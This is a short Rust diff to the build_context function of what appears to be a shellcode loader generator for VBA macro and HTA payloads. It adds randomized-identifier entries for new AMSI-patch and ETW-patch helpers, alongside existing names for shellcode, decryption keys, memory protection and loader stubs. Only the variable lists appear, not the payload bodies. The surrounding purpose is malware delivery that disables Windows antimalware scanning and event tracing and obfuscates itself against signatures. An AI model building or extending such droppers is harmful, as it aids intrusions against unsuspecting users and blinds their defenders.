@@ -273,6 +273,10 @@ fn build_context(config: &LoaderConfig) -> Context {
         "vba_lv_k32", "vba_lv_u32", "vba_lv_gcpos", "vba_lv_pt1", "vba_lv_pt2", "vba_lv_tstart",
         "vba_lv_schex", "vba_lv_keyhex", "vba_lv_k", "vba_lv_ki",
         "vba_lv_raw", "vba_lv_sc", "vba_lv_mem", "vba_lv_oldp",
+        // fn_amsi_patch helper locals
+        "vba_lv_amsilib", "vba_lv_scanname", "vba_lv_amsibase", "vba_lv_scanaddr", "vba_lv_amsioldp",
+        // fn_etw_patch helper locals
+        "vba_lv_ntdllname", "vba_lv_etwname", "vba_lv_ntdllbase", "vba_lv_etwaddr", "vba_lv_etwoldp",
     ] {
         vars.insert(k, rand_ident(7));
     }
@@ -321,6 +325,10 @@ fn build_context(config: &LoaderConfig) -> Context {
         "hta_lv_schex", "hta_lv_keyhex", "hta_lv_k", "hta_lv_ki",
         "hta_lv_sc", "hta_lv_lcnt",
         "hta_lv_loader", "hta_lv_stubhex", "hta_lv_stubbytes", "hta_lv_asm", "hta_lv_t", "hta_lv_mi",
+        // fn_amsi helper locals
+        "hta_lv_aa", "hta_lv_at",
+        // fn_etw helper locals
+        "hta_lv_ea", "hta_lv_et", "hta_lv_ef",
     ] {
         vars.insert(k, rand_ident(7));
     }
